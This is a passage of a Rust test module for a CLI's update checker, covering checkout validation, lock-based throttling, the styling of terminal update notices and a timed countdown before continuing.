        let why = recorded_checkout_at(&record).expect_err("no record file yet");
        assert!(why.contains("no checkout is recorded"), "{why}");

        // A record pointing somewhere without the installer.
        let fake = dir.join("not-a-checkout");
        std::fs::create_dir_all(&fake).unwrap();
        std::fs::write(&record, fake.to_string_lossy().as_bytes()).unwrap();
        let why = recorded_checkout_at(&record).expect_err("no installer, no checkout");
        assert!(why.contains("install.sh"), "{why}");

        // The installer exists but there is no git work tree around it.
        std::fs::create_dir_all(fake.join("mac")).unwrap();
        std::fs::write(fake.join("mac/install.sh"), b"#!/bin/bash\n").unwrap();
        let why = recorded_checkout_at(&record).expect_err("not a work tree");
        assert!(why.contains("work tree"), "{why}");

        // A real work tree: accepted, and its cleanliness is readable.
        assert!(std::process::Command::new("git")
            .args(["-C"])
            .arg(&fake)
            .args(["init", "-q"])
            .status()
            .unwrap()
            .success());
        let root = recorded_checkout_at(&record).expect("a real checkout validates");
        assert_eq!(root, fake);
        assert!(
            !checkout_is_clean(&root).unwrap(),
            "the untracked installer counts as local state"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    // ------------------------------------------------------------ checker

    /// The claim-before-fetch ordering, observed from inside the fetch: by
    /// the time the network runs, the attempt is already on disk, so a
    /// checker that dies mid-fetch has still throttled.
    #[test]
    fn the_attempt_is_claimed_before_the_fetch_runs() {
        let dir = temp_dir("claim");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let seen = std::cell::Cell::new(0u64);
        run_checker_with(&cache_file, &lock_file, 1_700_000_000, || {
            seen.set(read_cache_from(&cache_file).last_attempt_unix);
            None
        })
        .unwrap();
        assert_eq!(
            seen.get(),
            1_700_000_000,
            "the fetch must find the attempt already persisted"
        );
        let after = read_cache_from(&cache_file);
        assert_eq!(after.latest, None, "a failed fetch adds no version");
        assert_eq!(after.last_attempt_unix, 1_700_000_000);
        std::fs::remove_dir_all(&dir).ok();
    }

    /// The lock is the kernel's cross-process atom: while one open file
    /// description holds it, a second claim loses without waiting.
    #[test]
    fn the_kernel_lock_admits_one_holder_and_frees_on_release() {
        let dir = temp_dir("lock");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let now = 1_700_000_000u64;

        let claim = claim_throttle_at(&lock_file).expect("first claim wins");
        let mut fetched = false;
        run_checker_with(&cache_file, &lock_file, now, || {
            fetched = true;
            None
        })
        .unwrap();
        assert!(
            !fetched,
            "a held lock means another checker owns the window"
        );

        // Release — by drop here, by death anywhere — frees the next claim
        // against the same path immediately. No staleness protocol exists to
        // test, because no corpse can exist: the lock lives in the kernel,
        // not in the file, and dies with its holder. That property is what
        // deleted the publish/judge/break steps a file-content lock needed,
        // each of which carried a measured race.
        drop(claim);
        assert!(
            claim_throttle_at(&lock_file).is_some(),
            "release frees the next claimant; nothing to time out, nothing to break"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    /// The child re-checks the throttle under the lock: the parent judged a
    /// cache another child may have advanced in the meantime.
    #[test]
    fn the_child_rechecks_the_throttle_under_the_lock() {
        let dir = temp_dir("recheck");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let now = 1_700_000_000u64;
        std::fs::write(
            &cache_file,
            format!(r#"{{"last_attempt_unix":{},"latest":null}}"#, now - 60),
        )
        .unwrap();
        let mut fetched = false;
        run_checker_with(&cache_file, &lock_file, now, || {
            fetched = true;
            None
        })
        .unwrap();
        assert!(!fetched, "another child attempted a minute ago; not due");
        std::fs::remove_dir_all(&dir).ok();
    }

    // ------------------------------------------------------------- notice

    fn advisory() -> UpdateAdvisory {
        UpdateAdvisory {
            installed: (0, 1, 0),
            latest: "0.2.0".into(),
        }
    }

    /// The exact styled payload, byte for byte: bold on the headline and on
    /// the lone command, typographic separators, nothing else.
    #[test]
    fn the_styled_rendering_is_exact() {
        assert_eq!(
            render_update(&advisory(), Style::Styled),
            "\u{1b}[1mCodeConnect update available\u{1b}[0m \u{b7} 0.1.0 \u{2192} 0.2.0\n\n\
             \u{1b}[1mcodeconnect update\u{1b}[0m"
        );
    }

    /// `NO_COLOR` kills every escape — bold included — and touches nothing
    /// typographic.
    #[test]
    fn no_color_keeps_the_typography_and_drops_all_sgr() {
        let text = render_update(&advisory(), Style::PlainUnicode);
        assert_eq!(
            text,
            "CodeConnect update available \u{b7} 0.1.0 \u{2192} 0.2.0\n\ncodeconnect update"
        );
        assert!(!text.contains('\u{1b}'));
    }

    /// Logs, pipes and dumb terminals get pure ASCII: no escapes, no
    /// multi-byte characters, no trailing spaces, everything under 80 cols.
    #[test]
    fn the_ascii_rendering_is_pure_ascii() {
        let text = render_update(&advisory(), Style::Ascii);
        assert_eq!(
            text,
            "CodeConnect update available: 0.1.0 -> 0.2.0\n\ncodeconnect update"
        );
        assert!(text.is_ascii());
        for line in text.lines() {
            assert!(line.len() < 80);
            assert_eq!(line, line.trim_end());
        }
    }

    /// The one styling decision: not-a-TTY or `TERM=dumb` forces ASCII;
    /// `NO_COLOR` — present even when empty — strips SGR but keeps the TTY
    /// typography; otherwise styled.
    #[test]
    fn styling_is_decided_by_the_three_documented_signals() {
        assert_eq!(
            style_for(false, Some("xterm-256color"), false),
            Style::Ascii
        );
        assert_eq!(style_for(true, Some("dumb"), false), Style::Ascii);
        assert_eq!(style_for(true, Some("dumb"), true), Style::Ascii);
        assert_eq!(
            style_for(true, Some("xterm-256color"), true),
            Style::PlainUnicode
        );
        assert_eq!(style_for(true, None, true), Style::PlainUnicode);
        assert_eq!(
            style_for(true, Some("xterm-256color"), false),
            Style::Styled
        );
    }

    /// The countdown speaks whole seconds, `10` first, never `0`, each
    /// frame erasing the last; the deadline is monotonic elapsed time, so a
    /// delayed tick shows the true remainder instead of replaying numbers.
    #[test]
    fn the_countdown_counts_real_time_down_and_never_says_zero() {
        assert_eq!(
            countdown_frame(10),
            "\r\u{1b}[2KContinuing in 10s\u{2026} Press Return to continue now."
        );

        let (_tx, rx) = std::sync::mpsc::channel::<()>();
        let mut out: Vec<u8> = Vec::new();
        // A fake clock: the first frame reads zero elapsed — "display 10
        // immediately" — and every later observation has jumped three
        // seconds. Elapsed time rules, so frames skip numbers (10, 7, 4, 1)
        // rather than replaying the ones the delay swallowed.
        let start = std::time::Instant::now();
        let mut observations = 0u64;
        hold_for_reading(
            std::time::Duration::from_secs(10),
            &rx,
            &mut out,
            move || {
                let elapsed = observations.saturating_sub(1) * 3;
                observations += 1;
                start + std::time::Duration::from_secs(elapsed)
            },
        );
        let text = String::from_utf8(out).unwrap();
        assert!(text.starts_with("\r\u{1b}[2KContinuing in 10s"));
        assert!(text.contains("in 7s"), "a 3s-late tick shows the remainder");
        assert!(!text.contains("in 0s"), "zero is never shown");
        assert!(
            text.ends_with(COUNTDOWN_CLEAR),
            "the line is erased before attach"
        );
    }

    /// Return — or stdin closing — ends the hold at once, with the line
    /// cleared; the ten seconds are never served blind.
    #[test]
    fn return_or_eof_ends_the_hold_immediately() {
        let (tx, rx) = std::sync::mpsc::channel::<()>();
        tx.send(()).unwrap();
        let mut out: Vec<u8> = Vec::new();
        let begun = std::time::Instant::now();
        hold_for_reading(
            std::time::Duration::from_secs(10),
            &rx,
            &mut out,
            std::time::Instant::now,
        );
        assert!(begun.elapsed() < std::time::Duration::from_secs(2));
        assert!(String::from_utf8(out).unwrap().ends_with(COUNTDOWN_CLEAR));

        // Disconnected sender = stdin reader gone (EOF): same immediate end.
        let (tx2, rx2) = std::sync::mpsc::channel::<()>();
        drop(tx2);
        let begun = std::time::Instant::now();
        hold_for_reading(
            std::time::Duration::from_secs(10),
            &rx2,
            &mut Vec::new(),
            std::time::Instant::now,
        );
        assert!(begun.elapsed() < std::time::Duration::from_secs(2));
    }

    /// The exhaustive styling truth table — every combination of the three
    /// signals — plus the real environment adapter driven with an injected
    /// lookup, including the convention's sharpest edge: an *empty*
    /// `NO_COLOR` still counts as present.
    #[test]
    fn every_styling_combination_lands_where_the_conventions_say() {
        for tty in [true, false] {
            for term in [Some("dumb"), Some("xterm-256color"), None] {
                for no_color in [true, false] {
                    let expected = if !tty || term == Some("dumb") {
                        Style::Ascii
                    } else if no_color {
                        Style::PlainUnicode
                    } else {
                        Style::Styled
                    };
                    assert_eq!(style_for(tty, term, no_color), expected);
                }
            }
        }

        let env = |vars: &'static [(&'static str, &'static str)]| {
            move |name: &str| -> Option<std::ffi::OsString> {
                vars.iter()
                    .find(|(key, _)| *key == name)
                    .map(|(_, value)| std::ffi::OsString::from(value))
            }
        };
        assert_eq!(
            style_from_env(true, env(&[("TERM", "xterm"), ("NO_COLOR", "")])),
            Style::PlainUnicode,
            "empty NO_COLOR is still NO_COLOR"
        );
        assert_eq!(style_from_env(true, env(&[("TERM", "dumb")])), Style::Ascii);
        assert_eq!(
            style_from_env(true, env(&[("TERM", "xterm")])),
            Style::Styled
        );
        assert_eq!(style_from_env(false, env(&[])), Style::Ascii);
    }

    /// The full countdown transcript under a 3s-per-tick clock, byte for
    /// byte, with exactly one flush per frame plus one for the clear — no
    /// buffered frame can lag the second it names.
    #[test]
    fn the_countdown_transcript_and_flush_discipline_are_exact() {
        struct CountingSink {
            bytes: Vec<u8>,
            flushes: usize,
        }
        impl std::io::Write for CountingSink {
            fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
                self.bytes.extend_from_slice(buf);
                Ok(buf.len())
            }
            fn flush(&mut self) -> std::io::Result<()> {
                self.flushes += 1;
                Ok(())
            }
        }
        let (_tx, rx) = std::sync::mpsc::channel::<()>();
        let mut sink = CountingSink {
            bytes: Vec::new(),
            flushes: 0,
        };
        let start = std::time::Instant::now();
        let mut observations = 0u64;
        hold_for_reading(
            std::time::Duration::from_secs(10),
            &rx,
            &mut sink,
            move || {
                let elapsed = observations.saturating_sub(1) * 3;
                observations += 1;
                start + std::time::Duration::from_secs(elapsed)
            },
        );
        let expected: String = [10u64, 7, 4, 1]
            .iter()
            .map(|n| countdown_frame(*n))
            .collect::<String>()
            + COUNTDOWN_CLEAR;
        assert_eq!(String::from_utf8(sink.bytes).unwrap(), expected);
        assert_eq!(sink.flushes, 5, "four frames and the clear, each flushed");
    }

    /// The *real* listener, fed real input shapes: a completed Return line
    /// signals, and true EOF — `read_line` returning zero bytes — signals
    /// identically. Neither can leave the hold waiting out its ten seconds.
    #[test]
    fn the_line_listener_signals_on_return_and_on_real_eof() {
        for input in [&b"\n"[..], &b""[..]] {
            let rx = spawn_line_listener(std::io::Cursor::new(input.to_vec()));
            let begun = std::time::Instant::now();
            hold_for_reading(
                std::time::Duration::from_secs(10),
                &rx,
                &mut Vec::new(),
                std::time::Instant::now,
            );
            assert!(
                begun.elapsed() < std::time::Duration::from_secs(3),
                "input {input:?} must end the hold immediately"
            );
        }
    }

    /// `daemon status` renders for stdout's own signals and never counts
    /// down — the block cannot contain the countdown sentence by
    /// construction, and this pins it.
    #[test]
    fn the_status_block_styles_for_stdout_and_never_counts_down() {
        let advisory = advisory();
        let styled = status_update_block(&advisory, true, Some("xterm"), false);
        assert!(styled.contains("\u{1b}[1m"));
        let piped = status_update_block(&advisory, false, Some("xterm"), false);
        assert!(piped.is_ascii());
        for text in [styled, piped] {
            assert!(!text.contains("Continuing in"), "status never holds anyone");
        }
    }

    /// The boundary races, pinned: a wake 1ms *before* a whole second
    /// recomputes the same number and must write nothing; landing exactly
    /// on the boundary, and 1ms after it, each produce their frame exactly
    /// once. Frame identity is the number, not the timer.
    #[test]
    fn boundary_jitter_never_doubles_a_frame() {
        struct CountingSink {
            bytes: Vec<u8>,
            flushes: usize,
        }
        impl std::io::Write for CountingSink {
            fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
                self.bytes.extend_from_slice(buf);
                Ok(buf.len())
            }
            fn flush(&mut self) -> std::io::Result<()> {
                self.flushes += 1;
                Ok(())
            }
        }
        let (_tx, rx) = std::sync::mpsc::channel::<()>();
        let mut sink = CountingSink {
            bytes: Vec::new(),
            flushes: 0,
        };
        // Observations, in seconds: the early wake (0.999), the exact
        // boundary (1.0), a late wake (2.001), then out.
        let offsets = [0.0, 0.0, 0.999, 1.0, 2.001, 10.0];
        let start = std::time::Instant::now();
        let mut calls = 0usize;
        hold_for_reading(
            std::time::Duration::from_secs(10),
            &rx,
            &mut sink,
            move || {
                let offset = offsets[calls.min(offsets.len() - 1)];
                calls += 1;
                start + std::time::Duration::from_secs_f64(offset)
            },
        );
        let expected: String = [10u64, 9, 8]
            .iter()
            .map(|n| countdown_frame(*n))
            .collect::<String>()
            + COUNTDOWN_CLEAR;
        assert_eq!(
            String::from_utf8(sink.bytes).unwrap(),
            expected,
            "10 once (early wake writes nothing), 9 at the boundary, 8 after"
        );
        assert_eq!(sink.flushes, 4, "three frames and the clear");
    }

    #[test]
    fn equal_and_older_releases_stay_silent() {
        let cache = |latest: &str| UpdateCache {
            last_attempt_unix: 0,
            latest: Some(latest.into()),
        };
        assert_eq!(
            update_advisory(&cache("0.1.0"), (0, 1, 0)),
            None,
            "equal is current"
        );
        assert_eq!(
            update_advisory(&cache("0.0.9"), (0, 1, 0)),
            None,
            "older is not news"
        );
        assert!(update_advisory(&cache("0.1.1"), (0, 1, 0)).is_some());
        assert_eq!(
            update_advisory(&UpdateCache::default(), (0, 1, 0)),
            None,
            "no validated answer, no claim"
        );
    }
}
